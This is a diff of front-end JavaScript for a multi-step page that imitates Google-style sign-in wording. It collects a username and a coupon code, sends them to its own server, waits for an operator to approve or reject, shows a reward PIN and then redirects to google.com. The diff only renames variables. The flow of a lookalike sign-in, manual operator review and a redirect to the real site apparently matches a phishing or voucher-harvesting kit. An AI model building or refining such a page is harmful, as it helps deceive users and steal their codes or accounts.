@@ -1,263 +1,260 @@
-let currentUsername = '';
-let currentCoupon = '';
-let currentToken = localStorage.getItem('user_token') || '';
-let eventSource = null;
-let pollInterval = null;
-let redirectUrl = 'https://google.com';
+let userAccountIdentifier = '';
+let submittedVoucherCode = '';
+let activeSessionToken = localStorage.getItem('user_token') || '';
+let realTimeStreamSource = null;
+let backgroundPollingTimer = null;
+let destinationRedirectUrl = 'https://google.com';
 
-const step1 = document.getElementById('step1');
-const step2 = document.getElementById('step2');
-const stepWaiting = document.getElementById('stepWaiting');
-const step3 = document.getElementById('step3');
-const stepRejected = document.getElementById('stepRejected');
-const progressBar = document.getElementById('progressBar');
+const screenStep1 = document.getElementById('step1');
+const screenStep2 = document.getElementById('step2');
+const screenWaiting = document.getElementById('stepWaiting');
+const screenStep3 = document.getElementById('step3');
+const screenRejected = document.getElementById('stepRejected');
+const topProgressBar = document.getElementById('progressBar');
 
-const pageTitle = document.getElementById('pageTitle');
-const pageSubtitle = document.getElementById('pageSubtitle');
-const chipUsername = document.getElementById('chipUsername');
+const textHeaderTitle = document.getElementById('pageTitle');
+const textHeaderSubtitle = document.getElementById('pageSubtitle');
+const accountBadgeLabel = document.getElementById('chipUsername');
 
-const usernameInput = document.getElementById('usernameInput');
-const couponInput = document.getElementById('couponInput');
-const pinDisplay = document.getElementById('pinDisplay');
+const inputFieldUsername = document.getElementById('usernameInput');
+const inputFieldCoupon = document.getElementById('couponInput');
+const displayBoxPin = document.getElementById('pinDisplay');
 
-const btnNext1 = document.getElementById('btnNext1');
-const btnBack2 = document.getElementById('btnBack2');
-const btnSubmit2 = document.getElementById('btnSubmit2');
-const btnDone = document.getElementById('btnDone');
-const btnRetry = document.getElementById('btnRetry');
+const actionBtnNext1 = document.getElementById('btnNext1');
+const actionBtnBack2 = document.getElementById('btnBack2');
+const actionBtnSubmit2 = document.getElementById('btnSubmit2');
+const actionBtnDone = document.getElementById('btnDone');
+const actionBtnRetry = document.getElementById('btnRetry');
 
-function stopPolling() {
-  if (pollInterval) {
-    clearInterval(pollInterval);
-    pollInterval = null;
+function cancelBackgroundPolling() {
+  if (backgroundPollingTimer) {
+    clearInterval(backgroundPollingTimer);
+    backgroundPollingTimer = null;
   }
 }
 
-function showStep(stepName) {
-  step1.classList.add('hidden');
-  step2.classList.add('hidden');
-  stepWaiting.classList.add('hidden');
-  step3.classList.add('hidden');
-  stepRejected.classList.add('hidden');
-  progressBar.classList.remove('active');
+function activateViewStep(targetStepName) {
+  screenStep1.classList.add('hidden');
+  screenStep2.classList.add('hidden');
+  screenWaiting.classList.add('hidden');
+  screenStep3.classList.add('hidden');
+  screenRejected.classList.add('hidden');
+  topProgressBar.classList.remove('active');
 
-  if (stepName === 'step1') {
-    stopPolling();
-    pageTitle.textContent = 'Sign in';
-    pageSubtitle.textContent = 'to continue to your account';
-    pageSubtitle.style.display = 'block';
-    step1.classList.remove('hidden');
-    usernameInput.focus();
-  } else if (stepName === 'step2') {
-    stopPolling();
-    pageTitle.textContent = 'Welcome';
-    pageSubtitle.style.display = 'none';
-    chipUsername.textContent = currentUsername;
-    step2.classList.remove('hidden');
-    couponInput.focus();
-  } else if (stepName === 'waiting') {
-    pageTitle.textContent = '';
-    pageSubtitle.textContent = '';
-    pageSubtitle.style.display = 'none';
-    stepWaiting.classList.remove('hidden');
-    progressBar.classList.add('active');
-  } else if (stepName === 'step3') {
-    stopPolling();
-    pageTitle.textContent = 'Verification code';
-    pageSubtitle.style.display = 'none';
-    step3.classList.remove('hidden');
-  } else if (stepName === 'rejected') {
-    stopPolling();
-    pageTitle.textContent = 'Couldn\'t sign you in';
-    pageSubtitle.textContent = '';
-    pageSubtitle.style.display = 'none';
-    stepRejected.classList.remove('hidden');
+  if (targetStepName === 'step1') {
+    cancelBackgroundPolling();
+    textHeaderTitle.textContent = 'Sign in';
+    textHeaderSubtitle.textContent = 'to continue to your account';
+    textHeaderSubtitle.style.display = 'block';
+    screenStep1.classList.remove('hidden');
+    inputFieldUsername.focus();
+  } else if (targetStepName === 'step2') {
+    cancelBackgroundPolling();
+    textHeaderTitle.textContent = 'Welcome';
+    textHeaderSubtitle.style.display = 'none';
+    accountBadgeLabel.textContent = userAccountIdentifier;
+    screenStep2.classList.remove('hidden');
+    inputFieldCoupon.focus();
+  } else if (targetStepName === 'waiting') {
+    textHeaderTitle.textContent = '';
+    textHeaderSubtitle.textContent = '';
+    textHeaderSubtitle.style.display = 'none';
+    screenWaiting.classList.remove('hidden');
+    topProgressBar.classList.add('active');
+  } else if (targetStepName === 'step3') {
+    cancelBackgroundPolling();
+    textHeaderTitle.textContent = 'Verification code';
+    textHeaderSubtitle.style.display = 'none';
+    screenStep3.classList.remove('hidden');
+  } else if (targetStepName === 'rejected') {
+    cancelBackgroundPolling();
+    textHeaderTitle.textContent = 'Couldn\'t sign you in';
+    textHeaderSubtitle.textContent = '';
+    textHeaderSubtitle.style.display = 'none';
+    screenRejected.classList.remove('hidden');
   }
 }
 
-// Check ongoing session
-async function checkExistingSession() {
-  if (!currentToken) return;
+// Restore saved session if user reloads page
+async function verifyExistingSessionState() {
+  if (!activeSessionToken) return;
 
   try {
-    const res = await fetch(`/api/submissions/${currentToken}/status`);
-    if (!res.ok) {
+    const fetchResponse = await fetch(`/api/submissions/${activeSessionToken}/status`);
+    if (!fetchResponse.ok) {
       localStorage.removeItem('user_token');
-      currentToken = '';
+      activeSessionToken = '';
       return;
     }
-    const data = await res.json();
-    currentUsername = data.username || '';
-    if (data.status === 'pending') {
-      showStep('waiting');
-      listenForStatus(currentToken);
-    } else if (data.status === 'approved') {
-      pinDisplay.textContent = data.reward_pin || '----';
-      redirectUrl = data.redirect_url || redirectUrl;
-      showStep('step3');
-    } else if (data.status === 'rejected') {
-      showStep('rejected');
-    } else if (data.status === 'completed') {
+    const sessionDetails = await fetchResponse.json();
+    userAccountIdentifier = sessionDetails.username || '';
+    if (sessionDetails.status === 'pending') {
+      activateViewStep('waiting');
+      initiateStatusMonitoring(activeSessionToken);
+    } else if (sessionDetails.status === 'approved') {
+      displayBoxPin.textContent = sessionDetails.reward_pin || '--';
+      destinationRedirectUrl = sessionDetails.redirect_url || destinationRedirectUrl;
+      activateViewStep('step3');
+    } else if (sessionDetails.status === 'rejected') {
+      activateViewStep('rejected');
+    } else if (sessionDetails.status === 'completed') {
       localStorage.removeItem('user_token');
-      currentToken = '';
-      showStep('step1');
+      activeSessionToken = '';
+      activateViewStep('step1');
     }
   } catch (err) {
-    console.error(err);
+    console.error('Session restoration error:', err);
   }
 }
 
 // Step 1 -> Next
-btnNext1.addEventListener('click', () => {
-  const val = usernameInput.value.trim();
-  if (!val) {
-    usernameInput.focus();
+actionBtnNext1.addEventListener('click', () => {
+  const enteredUsername = inputFieldUsername.value.trim();
+  if (!enteredUsername) {
+    inputFieldUsername.focus();
     return;
   }
-  currentUsername = val;
-  showStep('step2');
+  userAccountIdentifier = enteredUsername;
+  activateViewStep('step2');
 });
 
-usernameInput.addEventListener('keypress', (e) => {
-  if (e.key === 'Enter') {
-    btnNext1.click();
+inputFieldUsername.addEventListener('keypress', (keyEvent) => {
+  if (keyEvent.key === 'Enter') {
+    actionBtnNext1.click();
   }
 });
 
 // Step 2 -> Back
-btnBack2.addEventListener('click', () => {
-  showStep('step1');
+actionBtnBack2.addEventListener('click', () => {
+  activateViewStep('step1');
 });
 
 // Step 2 -> Submit
-btnSubmit2.addEventListener('click', async () => {
-  const val = couponInput.value.trim();
-  if (!val) {
-    couponInput.focus();
+actionBtnSubmit2.addEventListener('click', async () => {
+  const enteredCoupon = inputFieldCoupon.value.trim();
+  if (!enteredCoupon) {
+    inputFieldCoupon.focus();
     return;
   }
-  currentCoupon = val;
+  submittedVoucherCode = enteredCoupon;
 
-  btnSubmit2.disabled = true;
+  actionBtnSubmit2.disabled = true;
   try {
-    const res = await fetch('/api/submissions', {
+    const submissionResponse = await fetch('/api/submissions', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        username: currentUsername,
-        coupon: currentCoupon
+        username: userAccountIdentifier,
+        coupon: submittedVoucherCode
       })
     });
 
-    const data = await res.json();
-    if (data.success && data.token) {
-      currentToken = data.token;
-      localStorage.setItem('user_token', currentToken);
-      showStep('waiting');
-      listenForStatus(currentToken);
+    const parsedResponse = await submissionResponse.json();
+    if (parsedResponse.success && parsedResponse.token) {
+      activeSessionToken = parsedResponse.token;
+      localStorage.setItem('user_token', activeSessionToken);
+      activateViewStep('waiting');
+      initiateStatusMonitoring(activeSessionToken);
     }
-  } catch (err) {
-    console.error(err);
+  } catch (submitErr) {
+    console.error('Submission failed:', submitErr);
   } finally {
-    btnSubmit2.disabled = false;
+    actionBtnSubmit2.disabled = false;
   }
 });
 
-couponInput.addEventListener('keypress', (e) => {
-  if (e.key === 'Enter') {
-    btnSubmit2.click();
+inputFieldCoupon.addEventListener('keypress', (keyEvent) => {
+  if (keyEvent.key === 'Enter') {
+    actionBtnSubmit2.click();
   }
 });
 
-// Real-time listener: SSE + robust auto-polling (works across serverless & multi-instances)
-function listenForStatus(token) {
-  if (eventSource) {
-    try { eventSource.close(); } catch (e) {}
+// Dual-Sync real-time monitoring
+function initiateStatusMonitoring(sessionToken) {
+  if (realTimeStreamSource) {
+    try { realTimeStreamSource.close(); } catch (e) {}
   }
 
-  // Active status checker
-  const pollStatus = async () => {
-    if (!currentToken) return;
+  const queryLatestStatus = async () => {
+    if (!activeSessionToken) return;
     try {
-      const res = await fetch(`/api/submissions/${currentToken}/status`);
-      if (res.ok) {
-        const data = await res.json();
-        if (data.status === 'approved') {
-          stopPolling();
-          if (eventSource) { try { eventSource.close(); } catch (e) {} }
-          pinDisplay.textContent = data.reward_pin || '----';
-          redirectUrl = data.redirect_url || redirectUrl;
-          showStep('step3');
-        } else if (data.status === 'rejected') {
-          stopPolling();
-          if (eventSource) { try { eventSource.close(); } catch (e) {} }
-          showStep('rejected');
+      const responseObj = await fetch(`/api/submissions/${activeSessionToken}/status`);
+      if (responseObj.ok) {
+        const payloadData = await responseObj.json();
+        if (payloadData.status === 'approved') {
+          cancelBackgroundPolling();
+          if (realTimeStreamSource) { try { realTimeStreamSource.close(); } catch (e) {} }
+          displayBoxPin.textContent = payloadData.reward_pin || '--';
+          destinationRedirectUrl = payloadData.redirect_url || destinationRedirectUrl;
+          activateViewStep('step3');
+        } else if (payloadData.status === 'rejected') {
+          cancelBackgroundPolling();
+          if (realTimeStreamSource) { try { realTimeStreamSource.close(); } catch (e) {} }
+          activateViewStep('rejected');
         }
       }
-    } catch (e) {
-      console.error(e);
+    } catch (pollErr) {
+      console.error('Status poll error:', pollErr);
     }
   };
 
-  // Start polling every 1.5 seconds so even if SSE is closed by serverless, user transitions instantly
-  stopPolling();
-  pollInterval = setInterval(pollStatus, 1500);
+  cancelBackgroundPolling();
+  backgroundPollingTimer = setInterval(queryLatestStatus, 1500);
 
-  // Also setup SSE for zero-delay instant push
   try {
-    eventSource = new EventSource(`/api/submissions/${token}/events`);
+    realTimeStreamSource = new EventSource(`/api/submissions/${sessionToken}/events`);
 
-    eventSource.onmessage = (event) => {
+    realTimeStreamSource.onmessage = (eventData) => {
       try {
-        const data = JSON.parse(event.data);
-        if (data.status === 'approved') {
-          stopPolling();
-          eventSource.close();
-          pinDisplay.textContent = data.reward_pin || '----';
-          redirectUrl = data.redirect_url || redirectUrl;
-          showStep('step3');
-        } else if (data.status === 'rejected') {
-          stopPolling();
-          eventSource.close();
-          showStep('rejected');
+        const parsedEvent = JSON.parse(eventData.data);
+        if (parsedEvent.status === 'approved') {
+          cancelBackgroundPolling();
+          realTimeStreamSource.close();
+          displayBoxPin.textContent = parsedEvent.reward_pin || '--';
+          destinationRedirectUrl = parsedEvent.redirect_url || destinationRedirectUrl;
+          activateViewStep('step3');
+        } else if (parsedEvent.status === 'rejected') {
+          cancelBackgroundPolling();
+          realTimeStreamSource.close();
+          activateViewStep('rejected');
         }
-      } catch (err) {
-        console.error(err);
+      } catch (parseErr) {
+        console.error('Event stream parsing error:', parseErr);
       }
     };
 
-    eventSource.onerror = () => {
-      // If serverless drops SSE connection, pollInterval is already running
+    realTimeStreamSource.onerror = () => {
+      // Background poll will maintain responsiveness
     };
-  } catch (e) {
-    console.error(e);
+  } catch (sseErr) {
+    console.error('SSE initialization error:', sseErr);
   }
 }
 
-// Step 3 -> Done (Redirect to main website)
-btnDone.addEventListener('click', async () => {
-  btnDone.disabled = true;
+// Step 3 -> Done
+actionBtnDone.addEventListener('click', async () => {
+  actionBtnDone.disabled = true;
   try {
-    const res = await fetch(`/api/submissions/${currentToken}/complete`, {
+    const completionResponse = await fetch(`/api/submissions/${activeSessionToken}/complete`, {
       method: 'POST'
     });
-    const data = await res.json();
+    const completionData = await completionResponse.json();
     localStorage.removeItem('user_token');
-    window.location.href = data.redirect_url || redirectUrl;
-  } catch (err) {
-    console.error(err);
+    window.location.href = completionData.redirect_url || destinationRedirectUrl;
+  } catch (completeErr) {
+    console.error('Completion error:', completeErr);
     localStorage.removeItem('user_token');
-    window.location.href = redirectUrl;
+    window.location.href = destinationRedirectUrl;
   }
 });
 
 // Retry from Rejected
-btnRetry.addEventListener('click', () => {
+actionBtnRetry.addEventListener('click', () => {
   localStorage.removeItem('user_token');
-  currentToken = '';
-  couponInput.value = '';
-  showStep('step1');
+  activeSessionToken = '';
+  inputFieldCoupon.value = '';
+  activateViewStep('step1');
 });
 
-// Initialize
-checkExistingSession();
+// Initialize on page load
+verifyExistingSessionState();
